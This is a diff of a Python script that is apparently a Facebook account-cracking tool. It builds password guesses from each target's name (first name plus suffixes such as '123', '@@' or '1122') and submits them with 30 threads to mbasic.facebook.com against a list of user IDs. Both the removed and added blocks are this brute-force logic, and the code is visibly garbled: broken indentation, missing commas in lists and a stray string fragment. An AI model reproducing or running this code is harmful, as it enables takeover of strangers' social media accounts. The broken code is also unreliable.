@@ -243,50 +243,26 @@ class __xxx__:
             print('\033[1;37m Total Auto file IDs : %s ' % len(self.id))
             print('\033[1;37m Cracking Started...')
             print(47*"-")
-            with tred(max_workers=30) as pool:
-			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-			frs = nmf.split(' ')[0]
-			pwv = []
-			if len(nmf)<6:
-				if len(frs)<3:
-					pass
-				else:
-					pwv.append(frs+'123')
-					pwv.append(frs+'1234')
-					pwv.append(frs+'12345')
-					pwv.append(nmf)
-					pwv.append('57273200')
-					pwv.append(frs+'@')
-					pwv.append(frs+'@123')
-					pwv.append(frs+'@@')
-					pwv.append(frs+'@@@')
-					pwv.append(frs+'@@@@')
-					pwv.append(frs+'@#')
-					pwv.append(frs+'1122')
-					pwv.append(frs+'12')
-					pwv.append(frs+'11')
-					pwv.append(frs+'111')
-			else:
-				if len(frs)<3:
-					pwv.append(nmf)
-				else:
-					pwv.append(frs+'123')
-					pwv.append(frs+'1234')
-					pwv.append(frs+'12345')
-					pwv.append(nmf)
-					pwv.append('57273200')
-					pwv.append(frs+'@')
-					pwv.append(frs+'@123')
-					pwv.append(frs+'@@')
-					pwv.append(frs+'@@@')
-					pwv.append(frs+'@@@@')
-					pwv.append(frs+'@#')
-					pwv.append(frs+'1122')
-					pwv.append(frs+'12')
-					pwv.append(frs+'11')
-					pwv.append(frs+'111')
-					
-				pool.submit(crack,idf,pwv) "mbasic.facebook.com")
+            with sarfrazssb(max_workers=30) as ssbworld:
+                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
+                    try:
+                        uid, name = zsb.split('|')
+                        xz = name.split(' ')
+                        first, last = name.split(' ')
+                        firstl = first.lower()
+                        lastl = last.lower()
+                        firsts = first.capitalize()
+                        lasts = last.capitalize()
+                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
+                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"xz[0]+"1234"xz[0]+"@"xz[0]+"@@"xz[0]+"@@@"xz[0]+"@#"xz[0]+"11"xz[0]+"111"xz[0]+"1122"xz[0]+"112233"xz[0]+"@#"xz[0]+"@@##"]
+                        else:
+                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
+                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
+                            pwx = [firstl+' '+lastl, xz[0]+"1234", xz[0]+"123"]
+                            pwx = [firstl+' '+lastl, xz[0]+"@@@@", xz[0]+"@"]
+                            pwx = [firstl+' '+lastl, xz[0]+"@@", xz[0]+"@@@"]
+                            pwx = [firstl+' '+lastl, xz[0]+"@#", xz[0]+"@@##"]
+                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                     except:
                         pass
             hasil(ok,cp)
